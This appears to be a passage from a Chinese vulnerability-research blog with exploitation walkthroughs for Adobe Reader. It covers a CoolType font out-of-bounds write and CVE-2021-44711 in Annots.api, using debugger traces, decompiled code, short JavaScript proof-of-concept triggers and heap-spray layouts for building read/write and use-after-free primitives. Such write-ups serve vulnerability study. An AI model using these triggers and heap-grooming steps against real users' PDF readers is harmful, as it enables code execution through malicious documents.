724040e9 ff1504f35b72    call    dword ptr [CoolType!CTGetVersion+0x213cd4 (725bf304)] ds:002b:725bf304={KERNEL32!MultiByteToWideCharStub (75603da0)}
0:008&gt; dps esp L6
0b9ae9d8  000003a8	//CodePage
0b9ae9dc  00000000	//dwFlags
0b9ae9e0  1306e8a8	//lpMultiByteStr
0b9ae9e4  00000024	//cbMultiByte
0b9ae9e8  0b9aea08	//lpWideCharStr
0b9ae9ec  00000100	//cchWideChar
0:008&gt; dd 1306e8a8 Lc
1306e8a8  5001d608 51015001 61015101 62016101
1306e8b8  31016201 7a540f51 01521d18 20736e18
1306e8c8  74736574 74747474 74747474 00007474
0:008&gt; dd 0b9aea08 Lc
0b9aea08  0c4ef818 0c4ef810 0b9aea4c 6f6c53a8
0b9aea18  1306ded0 0c4c5588 00000000 00000000
0b9aea28  0b9aea50 6dc1901f 6dc19024 1fbe9e77
0:008&gt; p
eax=00000023 ebx=1306e8a8 ecx=c7dacb9e edx=0b9aea08 esi=00000024 edi=0b9aec3c
eip=724040ef esp=0b9ae9f0 ebp=0b9aec0c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
CoolType!CTGetVersion+0x58abf:
724040ef 85c0            test    eax,eax
0:008&gt; dd 0b9aea08 L23*2/4	//转换后0x23个字符的WideChar字符串
0b9aea08  003f0008 00010050 00010050 00010051
0b9aea18  00010051 00010061 00010061 00010062
0b9aea28  00010062 00510031 0054000f 0018007a
0b9aea38  0052001d 00180001 0073006e 00740020
0b9aea48  00730065
</code></pre></div></div>

<p>继续执行到<code class="language-plaintext highlighter-rouge">sub_800C383</code>，由于当前MultiByteSize小于WideCharSize * 2，会执行<code class="language-plaintext highlighter-rouge">memset</code>函数清空MultiByteStr：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:008&gt; pc
eax=0000002e ebx=1306e8a8 ecx=c7dacb9e edx=0b9aea08 esi=00000046 edi=0b9aec3c
eip=7240410d esp=0b9ae9e0 ebp=0b9aec0c iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000283
CoolType!CTGetVersion+0x58add:
7240410d e87182ecff      call    CoolType!CTInit+0x8d93 (722cc383)
0:008&gt; dps esp L4
0b9ae9e0  1306e8a8		//MultiByteStr
0b9ae9e4  0000002e		//MultiByteSize
0b9ae9e8  0b9aea08		//WideCharStr
0b9ae9ec  00000046		//WideCharSize * 2
0:008&gt; dd 1306e8a8 Lc	//原MultiByte字符串
1306e8a8  5001d608 51015001 61015101 62016101
1306e8b8  31016201 7a540f51 01521d18 20736e18
1306e8c8  74736574 74747474 74747474 00007474
0:008&gt; p
eax=00000022 ebx=1306e8a8 ecx=7df11661 edx=00000000 esi=00000046 edi=0b9aec3c
eip=72404112 esp=0b9ae9e0 ebp=0b9aec0c iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
CoolType!CTGetVersion+0x58ae2:
72404112 83c410          add     esp,10h
0:008&gt; dd 1306e8a8 Lc	//执行函数后被清空
1306e8a8  00000000 00000000 00000000 00000000
1306e8b8  00000000 00000000 00000000 00000000
1306e8c8  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>随后遍历被清空的MultByteStr，遍历的次数为转换后的WideChar的大小。当前MultByte的大小为0x2e，WideChar的大小为0x46。因此遍历到超过MultByte的大小时就造成了越界访问。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LABEL_83:
    if ( (_WORD)MultSize )
    {
      v44 = (_BYTE *)(EmptyMultByteStr + 1);
      v45 = ~EmptyMultByteStr;
      v51 = ~EmptyMultByteStr;
      do
      {
        if ( *(v44 - 1) || *v44 )		//POC崩溃处
        {
          if ( &amp;v44[v45] != (_BYTE *)offset )
          {
            *(_BYTE *)(EmptyMultByteStr + offset) = *(v44 - 1);
            *(_BYTE *)(offset + EmptyMultByteStr + 1) = *v44;
          }
          offset += 2;
        }
        MultSize = *(unsigned __int16 *)a3;
        v44 += 2;
        v46 = (int)&amp;v44[v45] &lt; MultSize;
        v45 = v51;
      }
      while ( v46 );
    }
    *(_WORD *)a3 = offset;
    return MultSize;
  }
</code></pre></div></div>

<h1 id="利用思路">利用思路</h1>

<p>该漏洞的利用方式和大部分越界写漏洞一致：</p>

<ol>
  <li>通过堆喷射ArrayBuffer对象制造MultByteStr大小的内存空洞</li>
  <li>触发漏洞，MultByteStr位于两个ArrayBuffer对象之间</li>
  <li>绕过<code class="language-plaintext highlighter-rouge">sub_800C383</code>的字符串长度校验，将WideChar的字符串覆盖临近ArrayBuffer对象的Length属性值，构造越界写原语</li>
  <li>通过越界写原语修改下一个临近ArrayBuffer对象的Length属性为0xFFFFFFFF，构造任意地址读写原语</li>
</ol>

<p>有了思路之后，首先需要确定控制MultByteStr大小的值位于POC中的位置，通过逆向可以得知该值通过一系列运算确定：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __thiscall GetMultStr(int this, __int16 a2, __int16 a3, __int16 a4, __int16 a5, unsigned __int16 *a6)
{
  int v7; // ebx
  unsigned __int8 *OriginStr; // esi
  __int16 v9; // cx
  __int16 v10; // dx
  unsigned __int16 MultiByteLength; // cx
  int MultiByteStr; // esi
  unsigned __int16 v14; // [esp+10h] [ebp-10h]
  unsigned __int16 v15; // [esp+14h] [ebp-Ch]
  unsigned __int16 v16; // [esp+18h] [ebp-8h]
  unsigned __int8 v17; // [esp+1Eh] [ebp-2h]
  unsigned __int8 v18; // [esp+1Fh] [ebp-1h]

  v7 = 0;
  if ( !*(_DWORD *)(this + 8) )
    return 0;
  OriginStr = *(unsigned __int8 **)(this + 0x18);
  if ( !*(_WORD *)(this + 0x14) )
    return 0;
  while ( 1 )
  {
    v9 = *OriginStr;
    OriginStr += 0xC;
    v10 = *(OriginStr - 11) | (unsigned __int16)(v9 &lt;&lt; 8);
    v16 = _byteswap_ushort(*((_WORD *)OriginStr - 5));
    v15 = _byteswap_ushort(*((_WORD *)OriginStr - 4));
    v14 = _byteswap_ushort(*((_WORD *)OriginStr - 3));
    v18 = *(OriginStr - 2);
    MultiByteLength = _byteswap_ushort(*((_WORD *)OriginStr - 2));	//获取MultiByteStr的长度
    v17 = *(OriginStr - 1);
    if ( a2 == v10 &amp;&amp; a3 == v16 &amp;&amp; a4 == v15 &amp;&amp; a5 == v14 )
      break;
    if ( (unsigned __int16)++v7 &gt;= *(_WORD *)(this + 0x14) )
      return 0;
  }
  *a6 = MultiByteLength;
  MultiByteStr = *(_DWORD *)(this + 4) + *(unsigned __int16 *)(this + 0x16) + (v17 | (v18 &lt;&lt; 8));	//获取MultiByteStr
  if ( (unsigned __int8)((_DWORD (__stdcall *)(int, _DWORD))sub_801A99B)(MultiByteStr, MultiByteLength) )
    return MultiByteStr;
  else
    return 0;
}
</code></pre></div></div>

<p>确定MultiByteStr的长度后，会调用malloc函数申请大小为MultiByteStr长度加1的内存空间，并将MultiByteStr拷贝到该块内存中：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>while ( 1 )
  {
    oldMultStr = (void *)GetMultStr(3, v13, (__int16)Src, a4, MultiByte);// 循环获取到str
    if ( LOWORD(MultiByte[0]) )
      break;
    if ( ++v13 &gt; 0xA )
      goto LABEL_22;
  }
  v14 = (void *)alloc(LOWORD(MultiByte[0]) + 1);// 调用malloc申请大小为MultiByteStr长度加1的内存空间
  memcpy(v14, oldMultStr, LOWORD(MultiByte[0]));// 拷贝MultiByteStr到新申请的内存中
</code></pre></div></div>

<p>修改POC使得MultiByteStr的长度为0x10f，通过JS代码堆喷射大小为0x100的ArrayBuffer对象同时制造内存空洞，使得MultiByteStr位于两个ArrayBuffer对象之中，修改后的内存布局如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; g
Breakpoint 0 hit
eax=0000010f ebx=0b5aea10 ecx=0b5aec3c edx=0000010f esi=1db0a4a0 edi=00000001
eip=709bfcb0 esp=0b5ae838 ebp=0b5ae9d4 iopl=0         nv up ei ng nz ac pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
CoolType!CTInit+0x1c6c0:
709bfcb0 55              push    ebp
0:009&gt; dps esp+4 L7
0b5ae83c  1db0a4a0
0b5ae840  0000010f
0b5ae844  0b5ae8f0
0b5ae848  00000001
0b5ae84c  00000000
0b5ae850  00000001
0b5ae854  00000000
0:009&gt; dd 1db0a4a0 L(110*2+8)/4
//----------------MultiByteStr---------------
1db0a4a0  41004100 41004100 41004100 41004100
1db0a4b0  41004100 41004100 41004100 41004100
1db0a4c0  41004100 41004100 41004100 41004100
1db0a4d0  41004100 41004100 41004100 41004100
1db0a4e0  41004100 41004100 41004100 41004100
1db0a4f0  41004100 41004100 41004100 41004100
1db0a500  41004100 41004100 41004100 41004100
1db0a510  41004100 41004100 41004100 41004100
1db0a520  41004100 41004100 41004100 41004100
1db0a530  41004100 41004100 41004100 41004100
1db0a540  41004100 41004100 41004100 41004100
1db0a550  41004100 41004100 41004100 41004100
1db0a560  41004100 41004100 41004100 41004100
1db0a570  41004100 41004100 41004100 41004100
1db0a580  41004100 41004100 41004100 41004100
1db0a590  41004100 41004100 41004100 41414100
1db0a5a0  41414141 41414141 41414141 00414141
//-------------------------------------------
1db0a5b0  399fd8af 88009700 00000000 00000100	//Arraybuffer.ByteLength = 0x100
1db0a5c0  00000000 00000000 ffffffff ffffffff
1db0a5d0  ffffffff ffffffff ffffffff ffffffff
1db0a5e0  ffffffff ffffffff ffffffff ffffffff
1db0a5f0  ffffffff ffffffff ffffffff ffffffff
1db0a600  ffffffff ffffffff ffffffff ffffffff
1db0a610  ffffffff ffffffff ffffffff ffffffff
1db0a620  ffffffff ffffffff ffffffff ffffffff
1db0a630  ffffffff ffffffff ffffffff ffffffff
1db0a640  ffffffff ffffffff ffffffff ffffffff
1db0a650  ffffffff ffffffff ffffffff ffffffff
1db0a660  ffffffff ffffffff ffffffff ffffffff
1db0a670  ffffffff ffffffff ffffffff ffffffff
1db0a680  ffffffff ffffffff ffffffff ffffffff
1db0a690  ffffffff ffffffff ffffffff ffffffff
1db0a6a0  ffffffff ffffffff ffffffff ffffffff
1db0a6b0  ffffffff ffffffff ffffffff ffffffff
1db0a6c0  ffffffff ffffffff
</code></pre></div></div>

<p>执行完毕<code class="language-plaintext highlighter-rouge">MultiToWide</code>函数后，临近Arraybuffer对象的长度被覆盖为0x410041：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:009&gt; dd 1db0a4a0 L(110*2+8)/4
//----------------MultiByteStr---------------
1db0a4a0  00410041 00410041 00410041 00410041
1db0a4b0  00410041 00410041 00410041 00410041
1db0a4c0  00410041 00410041 00410041 00410041
1db0a4d0  00410041 00410041 00410041 00410041
1db0a4e0  00410041 00410041 00410041 00410041
1db0a4f0  00410041 00410041 00410041 00410041
1db0a500  00410041 00410041 00410041 00410041
1db0a510  00410041 00410041 00410041 00410041
1db0a520  00410041 00410041 00410041 00410041
1db0a530  00410041 00410041 00410041 00410041
1db0a540  00410041 00410041 00410041 00410041
1db0a550  00410041 00410041 00410041 00410041
1db0a560  00410041 00410041 00410041 00410041
1db0a570  00410041 00410041 00410041 00410041
1db0a580  00410041 00410041 00410041 00410041
1db0a590  00410041 00410041 00410041 00410041
1db0a5a0  00410041 00410041 00410041 00410041
//-------------------------------------------
1db0a5b0  00410041 00410041 00410041 00410041	//Arraybuffer.ByteLength = 0x410041
1db0a5c0  00000000 00000000 ffffffff ffffffff
1db0a5d0  ffffffff ffffffff ffffffff ffffffff
1db0a5e0  ffffffff ffffffff ffffffff ffffffff
1db0a5f0  ffffffff ffffffff ffffffff ffffffff
1db0a600  ffffffff ffffffff ffffffff ffffffff
1db0a610  ffffffff ffffffff ffffffff ffffffff
1db0a620  ffffffff ffffffff ffffffff ffffffff
1db0a630  ffffffff ffffffff ffffffff ffffffff
1db0a640  ffffffff ffffffff ffffffff ffffffff
1db0a650  ffffffff ffffffff ffffffff ffffffff
1db0a660  ffffffff ffffffff ffffffff ffffffff
1db0a670  ffffffff ffffffff ffffffff ffffffff
1db0a680  ffffffff ffffffff ffffffff ffffffff
1db0a690  ffffffff ffffffff ffffffff ffffffff
1db0a6a0  ffffffff ffffffff ffffffff ffffffff
1db0a6b0  ffffffff ffffffff ffffffff ffffffff
1db0a6c0  ffffffff ffffffff
</code></pre></div></div>

<p>此时已经具有了越界写的能力，再次修改下一个临近Arraybuffer的对象的长度为0xFFFFFFFF即可完成读写原语的构造，剩下的利用过程大同小异就不再赘述了。</p>

<p>最终在Windows 10上完成了整个利用：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/44707.gif" alt="44707" /></p>

<h1 id="总结">总结</h1>

<p>该漏洞为Adobe Reader越界写漏洞，由于解析字体将字符串转化为宽字节字符串时没有进行完整的校验导致越界拷贝，利用的难度不大且触发稳定。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[漏洞概述 该漏洞为2021年天府杯中使用的Adobe Reader越界写漏洞，漏洞位于字体解析模块：CoolType.dll中，对应的Adobe Reader版本为：21.007.20099。]]></summary></entry><entry><title type="html">CVE-2021-44711 Adobe Reader整数溢出漏洞分析与利用</title><link href="http://localhost:4000/2022-09-09/CVE-2021-44711" rel="alternate" type="text/html" title="CVE-2021-44711 Adobe Reader整数溢出漏洞分析与利用" /><published>2022-09-09T00:00:00+08:00</published><updated>2022-09-09T00:00:00+08:00</updated><id>http://localhost:4000/2022-09-09/CVE-2021-44711</id><content type="html" xml:base="http://localhost:4000/2022-09-09/CVE-2021-44711"><![CDATA[<h1 id="前言">前言</h1>

<p>最近看到一篇<a href="https://vul.360.net/archives/434">Adobe Reader 漏洞 CVE-2021-44711 利用浅析</a>漏洞分析文章，打算从该漏洞开始学习PDF类型漏洞的分析与利用，根据文章的分析思路写出EXP。<!--more-->分析使用的软件版本为：<code class="language-plaintext highlighter-rouge">Adobe Acrobat Reader DC 2021.007.20099(x86)</code>。</p>

<h1 id="漏洞分析">漏洞分析</h1>

<p>漏洞通过PDF内嵌的js代码触发，POC代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _obj = {};
_obj[-1] = null;
var _annot = this.addAnnot({page:0, type:"Line", points:_obj});
</code></pre></div></div>

<p>POC非常简单，关键就在于Annotation 对象的 points属性原本应该由两个点<code class="language-plaintext highlighter-rouge">{[x1,y1],[x2,y2]}</code>组成的，代表Annotation对象直线的起点和终点。然而poc的代码将-1作为下标，在进行类型转换时导致了越界访问造成漏洞。</p>

<p>类型转换函数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//函数偏移：Annots.api+0x32EC6
if ( (int *)v11 != result )
    {
      do
      {
        index_str = (char *)(*(int (__thiscall **)(_DWORD, _DWORD))(dword_22747430 + 0x1C))(
                              *(_DWORD *)(dword_22747430 + 0x1C),
                              *(unsigned __int16 *)(v11 + 0x10));
        index_num = atoi_0(this_1, index_str);  // 转换字符下标为数字下标，将-1转化为0xffffffff
        v26 = 0x30;
        arraysize = v25[1] - *v25;
        HIDWORD(v21) = *v25;
        v22 = index_num;
        if ( arraysize / 0x30 &lt;= index_num )    // 如果数组对象的数量小于当前下标的值，则重新分配数组大小，此时index_num为0xfffffff &gt; 0
          resize(index_num + 1, var_11);   	// 根据下标重新分配数组大小
        sub_2212379A(v11 + 0x18);               // 类型转换
        result = (int *)sub_2212A202(&amp;v23);
        v11 = (int)v23;
      }
      while ( v23 != *v4 );
</code></pre></div></div>

<p>函数首先将字符下标index_str转换为数字下标index_num，随后判断当前下标是否大于目前数组对象的数量（0x30为单个数组对象的大小），如果大于则需要重新分配数组的大小。resize函数接收下标+1代表实际要访问的对象数量，resize函数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int __thiscall resize(_DWORD *this, unsigned int index, int arg_4)
{
  unsigned int Array_Num; // eax
  int target; // esi

  Array_Num = (this[1] - *this) / 0x30;		//由于Array为空，因此Array_Num=0
  if ( index &gt;= Array_Num )			//此时index为0，而Array_Num=0，因此直接返回当前数组大小为0
  {
    if ( index &gt; Array_Num )                    // 如果当前下标+1大于数组对象的数量，则需要重新分配数组大小
    {
      if ( index &lt;= (this[2] - *this) / 0x30 )
      {
        Array_Num = sub_2216FDF1(this[1], index - Array_Num);// 扩充array的大小符合index+1
        this[1] = Array_Num;
      }
      else
      {
        Array_Num = sub_2216FD0D(this, index, arg_4);// 检查index大于0x5555555时则抛出异常
      }
    }
  }
  else
  {
    target = *this + 0x30 * index;
    Array_Num = sub_2213A435(target, this[1]);
    this[1] = target;
  }
  return Array_Num;
}
</code></pre></div></div>

<p>当index为-1时，由于数组本身为空，因此resize函数中传入的index为0，而Array_Num也为0，因此直接返回了0作为实际的数组大小：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//执行完resize之后，此时ecx为this，即array的指针，eax为返回的resize后数组对象的个数
0:000&gt; dd ecx L4									//array中为空
08d615b8  00000000 00000000 00000000 00000000
0:000&gt; p
eax=00000000 ebx=07074508 ecx=00000000 edx=00000000 esi=08d7b840 edi=08d615b8
eip=6e873049 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
Annots!PlugInMain+0x15219:
6e873049 8b07            mov     eax,dword ptr [edi]  ds:002b:08d615b8=00000000		//获取array的起始地址
0:000&gt; p
eax=00000000 ebx=07074508 ecx=00000000 edx=00000000 esi=08d7b840 edi=08d615b8
eip=6e87304b esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
Annots!PlugInMain+0x1521b:
6e87304b 8b4dd4          mov     ecx,dword ptr [ebp-2Ch] ss:002b:0034bfdc=ffffffff	//获取index
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffff edx=00000000 esi=08d7b840 edi=08d615b8
eip=6e87304e esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
Annots!PlugInMain+0x1521e:
6e87304e eb03            jmp     Annots!PlugInMain+0x15223 (6e873053)
0:000&gt; p
eax=00000000 ebx=07074508 ecx=ffffffff edx=00000000 esi=08d7b840 edi=08d615b8
eip=6e873053 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
Annots!PlugInMain+0x15223:
6e873053 6bc930          imul    ecx,ecx,30h	//计算当前下标对象距离array起始地址的大小，index*0x30
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b840 edi=08d615b8	
eip=6e873056 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
Annots!PlugInMain+0x15226:
6e873056 83c618          add     esi,18h		//然而当前index乘0x30后得到0xffffffd0，是个错误的大小
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
eip=6e873059 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
Annots!PlugInMain+0x15229:
6e873059 56              push    esi
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
eip=6e87305a esp=0034bfbc ebp=0034c008 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
Annots!PlugInMain+0x1522a:
6e87305a 03c8            add     ecx,eax	//将array的起始地址加上当前下标对象距离，得到当前下标对象的地址，由于取到错误的大小导致拿到了错误的值
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
eip=6e87305c esp=0034bfbc ebp=0034c008 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
Annots!PlugInMain+0x1522c:
6e87305c e83907ffff      call    Annots!PlugInMain+0x596a (6e86379a)	//调用该函数进行类型转换，传入了错误了对象地址
0:000&gt; 
(f00.92c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=70f6f258 ebx=ffffffd0 ecx=ffffffd0 edx=00000000 esi=00000000 edi=ffffffd0
eip=6e863a2d esp=0034bf5c ebp=0034bf84 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
Annots!PlugInMain+0x5bfd:
6e863a2d 833f01          cmp     dword ptr [edi],1    ds:002b:ffffffd0=????????	//函数内部在获取当前下标对象时出现了访问异常
</code></pre></div></div>

<p>最终在执行类型转换函数时获取当前下标对象的地址：*this + index * 0x30时，获取到了错误的值0xffffffd0造成了访问异常。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<p>导致崩溃的原因是因为Annotation 对象的 points属性为空，导致获取目标index对象时直接访问了index * 0x30的地址。因此修改POC如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _annot = this.addAnnot({page:0, type:"Line"});
var _obj = {};
_obj[2] = 2;
_annot.points = _obj;
_obj[-1] = null;
_annot.points = _obj;
</code></pre></div></div>

<p>下断于resize函数，可以看到此时Array不再为空，大小为0x90：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; pc
eax=00000000 ebx=070616a8 ecx=070d6288 edx=00000000 esi=0706cf38 edi=070d6288
eip=70803044 esp=002fbbe8 ebp=002fbc38 iopl=0         nv up ei pl nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
Annots!PlugInMain+0x15214:
70803044 e83ecc0300      call    Annots!PlugInMain+0x51e57 (7083fc87)	//resize函数
0:000&gt; dd ecx l4				//Array _obj
070d6288  0700d8a0 0700d930 0700d930 00000000
0:000&gt; ? 0700d930 - 0700d8a0 			//Array Size = 0x90
Evaluate expression: 144 = 00000090
</code></pre></div></div>

<p>随后继续执行到类型转换函数，在获取当前下标对象的地址时，由于array不为空能够直接获取到array的起始地址，最终获取的结果正好为_obj[-1]，造成了内存越界访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; P
eax=002fbb78 ebx=070616a8 ecx=ea9f14a7 edx=0000000b esi=0706cf38 edi=070d6288
eip=70803049 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x15219:
70803049 8b07            mov     eax,dword ptr [edi]  ds:002b:070d6288=0700d8a0		//获取array的起始地址，此时不为0
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ea9f14a7 edx=0000000b esi=0706cf38 edi=070d6288
eip=7080304b esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x1521b:
7080304b 8b4dd4          mov     ecx,dword ptr [ebp-2Ch] ss:002b:002fbc0c=ffffffff	//获取index
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffff edx=0000000b esi=0706cf38 edi=070d6288
eip=7080304e esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x1521e:
7080304e eb03            jmp     Annots!PlugInMain+0x15223 (70803053)
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffff edx=0000000b esi=0706cf38 edi=070d6288
eip=70803053 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x15223:
70803053 6bc930          imul    ecx,ecx,30h	//计算当前下标对象距离array起始地址的大小，index*0x30
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf38 edi=070d6288
eip=70803056 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
Annots!PlugInMain+0x15226:
70803056 83c618          add     esi,18h
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf50 edi=070d6288
eip=70803059 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x15229:
70803059 56              push    esi
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf50 edi=070d6288
eip=7080305a esp=002fbbec ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x1522a:
7080305a 03c8            add     ecx,eax	//获取当前下标对象的地址为_obj[-1]，即*this - 0x30
0:000&gt; 
eax=0700d8a0 ebx=070616a8 ecx=0700d870 edx=0000000b esi=0706cf50 edi=070d6288
eip=7080305c esp=002fbbec ebp=002fbc38 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000203
Annots!PlugInMain+0x1522c:
7080305c e83907ffff      call    Annots!PlugInMain+0x596a (707f379a)	//类型转换函数
0:000&gt; dd ecx L30
//_obj[-1]，该块内存为越界读访问的内容
0700d870  00000000 00000000 00000000 00000000
0700d880  00010000 00000000 00010000 7217beb0
0700d890  0704eea8 80000000 0b758404 88007010
//_obj[0]
0700d8a0  00000000 0055005c 00000000 00000000
0700d8b0  0041005c 006d0064 006e0069 00730069
0700d8c0  00720074 00740061 00000000 0041005c
//_obj[1]
0700d8d0  00000000 00610044 00000000 00000000
0700d8e0  0061006f 0069006d 0067006e 0041005c
0700d8f0  006f0064 00650062 00000000 00720063
//_obj[2]
0700d900  00000000 00740061 00000000 40000000
0700d910  004d0054 006f0044 00730063 0073002e
0700d920  00760061 00760000 00000000 00000000
</code></pre></div></div>

<h2 id="内存越界访问转化为uaf">内存越界访问转化为UAF</h2>

<p>只是内存越界访问无法利用，然而在类型转换函数<code class="language-plaintext highlighter-rouge">sub_2212379A</code>中会根据*this的不同调用不同的转换函数：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220908120809935.png" alt="image-20220908120809935" /></p>

<p>分析这些转换函数后发现*this=0x1a时执行的函数内调用free函数释放了位于*(this+8)的内存：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220908143515273.png" alt="image-20220908143515273" /></p>

<p>接下来的利用思路就是将内存越界访问转化为UAF，具体的步骤如下：</p>

<ol>
  <li>通过堆喷大小为0x1ffd的Array对象占位稳定的内存地址0x20000048，使得后续漏洞触发释放该块内存</li>
  <li>再次堆喷大小为0x10大小的Array对象布局内存，使得漏洞触发时*this=0x1a，*(this+8) = 0x20000048，漏洞触发后内存地址被释放</li>
</ol>

<p>主要的难点在于如何构造0x10大小的Array对象布局内存，上面的分析可以得出obj对象占用的内存大小为0x90。因此只需要堆喷0x90大小的对象，并制造内存空洞，就可以让_obj对象精确的位于两个精心构造的内存之间：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00  -&gt;  +---------------------+
          | 	   Array	|
0x90  -&gt;  +---------------------+
          |        free         |  &lt;------ _obj
0x120 -&gt;  +---------------------+
          |        Array        |
0x1b0 -&gt;  +---------------------+
          |        free         |
0x240 -&gt;  +---------------------+
          |        Array        |
0x2d0 -&gt;  +---------------------+
</code></pre></div></div>

<p>因此需要堆喷的0x10大小的Array对象内存布局如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>js:
fakelement = new Array(0x10);
fakelement[11] = 0x1a;
fakelement[12] = 0x20000048;

0:000&gt; dd 07e21608 L26
//fakelement_01
07e21608  00000000 0000000d 00000010 00000010
07e21618  00000000 ffffff84 00000000 ffffff84
07e21628  00000000 ffffff84 00000000 ffffff84
07e21638  00000000 ffffff84 00000000 ffffff84
07e21648  00000000 ffffff84 00000000 ffffff84
07e21658  00000000 ffffff84 00000000 ffffff84
07e21668  00000000 ffffff84 0000001a ffffff81
07e21678  20000048 ffffff81 00000000 00000000
07e21688  00000000 00000000 00000000 00000000
07e21698  62334f4b 88000000
//fakelement_02
0:000&gt; dd 07e216a0  L26
07e216a0  00000000 0000000d 00000010 00000010
07e216b0  00000000 ffffff84 00000000 ffffff84
07e216c0  00000000 ffffff84 00000000 ffffff84
07e216d0  00000000 ffffff84 00000000 ffffff84
07e216e0  00000000 ffffff84 00000000 ffffff84
07e216f0  00000000 ffffff84 00000000 ffffff84
07e21700  00000000 ffffff84 0000001a ffffff81
